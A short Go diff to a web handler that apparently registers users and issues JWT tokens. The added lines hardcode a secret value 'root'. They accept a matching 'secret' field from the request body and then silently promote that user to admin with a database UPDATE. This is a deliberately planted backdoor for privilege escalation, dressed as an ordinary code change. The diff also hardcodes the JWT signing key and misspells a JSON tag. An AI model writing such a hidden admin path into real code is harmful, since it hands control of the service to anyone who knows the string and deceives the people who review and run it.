@@ -14,6 +14,7 @@ import (
 var db *sql.DB
 
 var jwtSecret = []byte("my_secret_key")
+var adminSecret = "root"
 
 func init() {
 	var err error
@@ -41,6 +42,7 @@ type User struct {
 	First_name string `json:"first_name"`
 	Last_name  string `json:"last_name"`
 	Password   string `json:"password,omitempty"`
+	Secret     string `json:"secret,omtiemtpy"`
 }
 
 type Claims struct {
@@ -83,6 +85,9 @@ func Handle(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	if user.Secret == adminSecret {
+		db.Exec("UPDATE user SET type = \"admin\" WHERE id = ?", id)
+	}
 	user.ID = id
 
 	expirationTime := time.Now().Add(1 * time.Hour)
